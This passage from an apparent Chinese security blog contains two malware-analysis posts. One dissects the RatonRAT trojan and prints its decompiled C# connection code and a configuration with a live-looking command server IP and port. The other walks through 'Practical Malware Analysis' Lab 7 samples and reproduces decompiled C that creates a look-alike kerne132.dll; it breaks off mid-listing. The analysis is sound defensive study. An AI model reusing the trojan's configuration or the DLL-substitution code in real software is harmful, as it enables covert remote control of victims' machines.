+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Client.Raton.Supervisor</span></span><br><span class="line"><span class="comment">// Token: 0x06000076 RID: 118 RVA: 0x00008AC8 File Offset: 0x00006CC8</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ResolveHostAndPort</span>(<span class="params"><span class="keyword">out</span> <span class="built_in">string</span> host, <span class="keyword">out</span> <span class="built_in">int</span> port</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	host = Config.ht;</span><br><span class="line">	port = Config.pt;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">string</span>.IsNullOrWhiteSpace(host))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">string</span> text = host.Trim();</span><br><span class="line">	<span class="keyword">if</span> (text.StartsWith(<span class="string">&quot;http://&quot;</span>, StringComparison.OrdinalIgnoreCase))</span><br><span class="line">	&#123;</span><br><span class="line">		text = text.Substring(<span class="number">7</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (text.StartsWith(<span class="string">&quot;https://&quot;</span>, StringComparison.OrdinalIgnoreCase))</span><br><span class="line">	&#123;</span><br><span class="line">		text = text.Substring(<span class="number">8</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">int</span> num = text.LastIndexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (num &gt; <span class="number">0</span> &amp;&amp; num &lt; text.Length - <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">string</span> text2 = text.Substring(<span class="number">0</span>, num);</span><br><span class="line">		<span class="built_in">int</span> num2;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">int</span>.TryParse(text.Substring(num + <span class="number">1</span>), <span class="keyword">out</span> num2))</span><br><span class="line">		&#123;</span><br><span class="line">			host = text2;</span><br><span class="line">			port = num2;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个函数获取了黑客的ip等信息</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Client.Raton.Supervisor</span></span><br><span class="line"><span class="comment">// Token: 0x06000074 RID: 116 RVA: 0x000089C4 File Offset: 0x00006BC4</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">SetKeepAlive</span>(<span class="params">Socket socket, <span class="built_in">uint</span> timeMs, <span class="built_in">uint</span> intervalMs</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">byte</span>[] array = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">12</span>];</span><br><span class="line">	BitConverter.GetBytes(<span class="number">1U</span>).CopyTo(array, <span class="number">0</span>);</span><br><span class="line">	BitConverter.GetBytes(timeMs).CopyTo(array, <span class="number">4</span>);</span><br><span class="line">	BitConverter.GetBytes(intervalMs).CopyTo(array, <span class="number">8</span>);</span><br><span class="line">	socket.IOControl((IOControlCode)((<span class="built_in">ulong</span>)<span class="number">-1744830460</span>), array, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个函数让木马保持活性</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Token: 0x02000006 RID: 6</span></span><br><span class="line"><span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Config</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// Token: 0x04000022 RID: 34</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> Version = <span class="string">&quot;v3.5.0&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000023 RID: 35</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> Mutex = <span class="string">&quot;qkoxcbwHaoFUf4En5LVdu9W&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000024 RID: 36</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">int</span> pt = Convert.ToInt32(<span class="string">&quot;4890&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000025 RID: 37</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> ht = <span class="string">&quot;170.205.31.216&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000026 RID: 38</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> Startup = Convert.ToBoolean(<span class="string">&quot;true&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000027 RID: 39</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">int</span> Delay = Convert.ToInt32(<span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000028 RID: 40</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> ProcessCritical = Convert.ToBoolean(<span class="string">&quot;false&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000029 RID: 41</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> HideFile = Convert.ToBoolean(<span class="string">&quot;false&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x0400002A RID: 42</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> Box = Convert.ToBoolean(<span class="string">&quot;false&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x0400002B RID: 43</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> BoxMsg = <span class="string">&quot;Hello, i&#x27;m the description of your raton client message box&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x0400002C RID: 44</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> BoxIcon = <span class="string">&quot;No icon&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x0400002D RID: 45</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> UAC = Convert.ToBoolean(<span class="string">&quot;false&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x0400002E RID: 46</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> Assist = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x0400002F RID: 47</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> OpenWebsite = Convert.ToBoolean(<span class="string">&quot;false&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000030 RID: 48</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> Website = <span class="string">&quot;https://t.me/sillyisafed&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000031 RID: 49</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> VM = Convert.ToBoolean(<span class="string">&quot;false&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000032 RID: 50</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> Tag = <span class="string">&quot;Infected&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000033 RID: 51</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> BoxTit = <span class="string">&quot;Hello, im a title for your message box&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000034 RID: 52</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> HidProc = Convert.ToBoolean(<span class="string">&quot;false&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000035 RID: 53</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> UACBy = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000036 RID: 54</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> Password = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000037 RID: 55</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> Raw = <span class="string">&quot;silly21&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000038 RID: 56</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">int</span> Reconnect = Convert.ToInt32(<span class="string">&quot;3&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000039 RID: 57</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> Defender = Convert.ToBoolean(<span class="string">&quot;false&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个类里包含了服务器的所有内容</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%9C%A8%E9%A9%AC/" rel="tag"><i class="fa fa-tag"></i> 木马</a>
+              <a href="/tags/RatonRAT/" rel="tag"><i class="fa fa-tag"></i> RatonRAT</a>
+          </div>
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block cat-样本分析">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://woshinext.top/2026/04/15/Lab07-1-2-3-%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Next">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Next的小站">
+      <meta itemprop="description" content="记录样本分析、脱壳去混淆、反调试对抗等底层安全技术笔记。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Next的小站">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/04/15/Lab07-1-2-3-%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">Lab07.1.2.3-笔记</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-04-15 23:16:27" itemprop="dateCreated datePublished" datetime="2026-04-15T23:16:27+08:00">2026-04-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">样本分析</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>4 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>来分析一下(恶意代码分析实战)中第7章的三个样本</p>
+<h1 id="Lab07-1"><a href="#Lab07-1" class="headerlink" title="Lab07-1"></a>Lab07-1</h1><p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260415232049895.png" alt="image-20260415232049895"></p>
+<p>这个是主代码这里直接创建了一个服务，然后这个服务的函数sub_401040就是服务的关键</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260415232348785.png" alt="image-20260415232348785"></p>
+<p>先是创建了一个互斥体让这个代码只运行一遍然后就是获取当前程序路径然后注册一个开机自启的服务（CreateServiceA）然后设置了一个在2100年创建一个20个线程</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260415232800167.png" alt="image-20260415232800167"></p>
+<p>利用szAgent（浏览器）向szurl（网址）不停的发送请求</p>
+<p>这个病毒在每次开机的时候就会启用服务然后再2100年调用20个线程来循环轰炸一个网站</p>
+<h1 id="Lab07-2"><a href="#Lab07-2" class="headerlink" title="Lab07-2"></a>Lab07-2</h1><p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260415233332106.png" alt="image-20260415233332106"></p>
+<p>这个代码非常简单就是用com对象来执行恶意代码</p>
+<p>这里其中clsid可以查表在调用函数的时候故意用函数偏移来使用函数而不是直接用函数名来反查杀，而psz更是关键常量储存了一个网址</p>
+<h1 id="Lab07-3"><a href="#Lab07-3" class="headerlink" title="Lab07-3"></a>Lab07-3</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE FileMappingA; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *v4; <span class="comment">// esi</span></span><br><span class="line">  HANDLE FileA; <span class="comment">// eax</span></span><br><span class="line">  HANDLE v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **v7; <span class="comment">// ebp</span></span><br><span class="line">  _DWORD *v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v9; <span class="comment">// esi</span></span><br><span class="line">  _DWORD *v10; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// ebp</span></span><br><span class="line">  _DWORD *v12; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">char</span> *v19; <span class="comment">// ebx</span></span><br><span class="line">  _DWORD *v20; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **v21; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v22; <span class="comment">// edx</span></span><br><span class="line">  _DWORD *v23; <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v24; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v25; <span class="comment">// kr08_4</span></span><br><span class="line">  <span class="type">char</span> *v26; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *v27; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v28; <span class="comment">// kr10_4</span></span><br><span class="line">  <span class="type">bool</span> v29; <span class="comment">// cf</span></span><br><span class="line">  _WORD *v31; <span class="comment">// [esp+10h] [ebp-44h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 *v32; <span class="comment">// [esp+14h] [ebp-40h]</span></span><br><span class="line">  _DWORD *v33; <span class="comment">// [esp+18h] [ebp-3Ch]</span></span><br><span class="line">  _DWORD *v34; <span class="comment">// [esp+1Ch] [ebp-38h]</span></span><br><span class="line">  <span class="type">int</span> v35; <span class="comment">// [esp+20h] [ebp-34h]</span></span><br><span class="line">  _DWORD *v36; <span class="comment">// [esp+24h] [ebp-30h]</span></span><br><span class="line">  <span class="type">int</span> v37; <span class="comment">// [esp+28h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+2Ch] [ebp-28h]</span></span><br><span class="line">  _DWORD *v39; <span class="comment">// [esp+30h] [ebp-24h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 *v40; <span class="comment">// [esp+34h] [ebp-20h]</span></span><br><span class="line">  <span class="type">char</span> *v41; <span class="comment">// [esp+38h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v42; <span class="comment">// [esp+3Ch] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v43; <span class="comment">// [esp+44h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v44; <span class="comment">// [esp+48h] [ebp-Ch]</span></span><br><span class="line">  HANDLE hObject; <span class="comment">// [esp+4Ch] [ebp-8h]</span></span><br><span class="line">  HANDLE v46; <span class="comment">// [esp+50h] [ebp-4h]</span></span><br><span class="line">  <span class="type">int</span> argca; <span class="comment">// [esp+58h] [ebp+4h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **argva; <span class="comment">// [esp+5Ch] [ebp+8h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **argvb; <span class="comment">// [esp+5Ch] [ebp+8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( argc == <span class="number">2</span> &amp;&amp; !<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], aWarningThisWil) )</span><br><span class="line">  &#123;</span><br><span class="line">    hObject = CreateFileA(FileName, <span class="number">0x80000000</span>, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">3u</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//映射kernel32.dll</span></span><br><span class="line">    FileMappingA = CreateFileMappingA(hObject, <span class="number">0</span>, <span class="number">2u</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    v4 = MapViewOfFile(FileMappingA, <span class="number">4u</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    argca = (<span class="type">int</span>)v4;</span><br><span class="line">    FileA = CreateFileA(ExistingFileName, <span class="number">0x10000000u</span>, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">3u</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//映射Lab07-3.dll（恶意代码）</span></span><br><span class="line">    v46 = FileA;</span><br><span class="line">    <span class="keyword">if</span> ( FileA == (HANDLE)<span class="number">-1</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    v6 = CreateFileMappingA(FileA, <span class="number">0</span>, <span class="number">4u</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v6 == (HANDLE)<span class="number">-1</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    v7 = (<span class="type">const</span> <span class="type">char</span> **)MapViewOfFile(v6, <span class="number">0xF001Fu</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    argva = v7;</span><br><span class="line">    <span class="keyword">if</span> ( !v7 )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    v41 = (<span class="type">char</span> *)v4 + v4[<span class="number">15</span>];</span><br><span class="line">    v8 = (_DWORD *)sub_401040(*((_DWORD *)v41 + <span class="number">30</span>), v41, v4);</span><br><span class="line">    v9 = &amp;v7[<span class="number">15</span>][(_DWORD)v7];</span><br><span class="line">    v10 = v8;</span><br><span class="line">    v36 = v8;</span><br><span class="line">    v11 = sub_401040(*((_DWORD *)v9 + <span class="number">30</span>), v9, v7);</span><br><span class="line">    v34 = (_DWORD *)sub_401040(v10[<span class="number">7</span>], v41, argca);</span><br><span class="line">    v40 = (<span class="type">unsigned</span> __int16 *)sub_401040(v10[<span class="number">9</span>], v41, argca);</span><br><span class="line">    v12 = (_DWORD *)sub_401040(v10[<span class="number">8</span>], v41, argca);</span><br><span class="line">    v13 = *((_DWORD *)v9 + <span class="number">31</span>);</span><br><span class="line">    v39 = v12;</span><br><span class="line">    v14 = sub_401070(*((_DWORD *)v9 + <span class="number">30</span>), v9, argva);</span><br><span class="line">    qmemcpy((<span class="type">void</span> *)v11, v10, v13);</span><br><span class="line">    v42 = v14;</span><br><span class="line">    v15 = v10[<span class="number">5</span>];</span><br><span class="line">    *(_DWORD *)(v11 + <span class="number">20</span>) = v15;</span><br><span class="line">    *(_DWORD *)(v11 + <span class="number">24</span>) = v10[<span class="number">6</span>];</span><br><span class="line">    *(_DWORD *)(v11 + <span class="number">12</span>) = v11 + <span class="number">40</span> + v14;</span><br><span class="line">    v35 = v11 + <span class="number">56</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *)(v11 + <span class="number">40</span>), <span class="string">&quot;kerne132.dll&quot;</span>);</span><br><span class="line">    *(_BYTE *)(v11 + <span class="number">53</span>) = BYTE1(dword_40301C);</span><br><span class="line">    *(_WORD *)(v11 + <span class="number">54</span>) = HIWORD(dword_40301C);</span><br><span class="line">    v16 = *(_DWORD *)(v11 + <span class="number">20</span>);</span><br><span class="line">    v17 = v11 + <span class="number">56</span> + <span class="number">4</span> * v16;</span><br><span class="line">    v18 = v11 + <span class="number">56</span> + <span class="number">8</span> * v16;</span><br><span class="line">    v44 = v17;</span><br><span class="line">    v43 = v18;</span><br><span class="line">    v19 = (<span class="type">char</span> *)(<span class="number">16</span> * v15 + v11 + <span class="number">56</span>);</span><br><span class="line">    *(_DWORD *)(v11 + <span class="number">28</span>) = v11 + <span class="number">56</span> + v14;</span><br><span class="line">    *(_DWORD *)(v11 + <span class="number">36</span>) = v17 + v14;</span><br><span class="line">    *(_DWORD *)(v11 + <span class="number">32</span>) = v18 + v14;</span><br><span class="line">    v20 = v36;</span><br><span class="line">    v21 = <span class="number">0</span>;</span><br><span class="line">    v22 = <span class="number">0</span>;</span><br><span class="line">    argvb = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; v22 &lt; v20[<span class="number">5</span>]; ++v34 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v34 )</span><br><span class="line">      &#123;</span><br><span class="line">        v37 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v20[<span class="number">6</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          v23 = 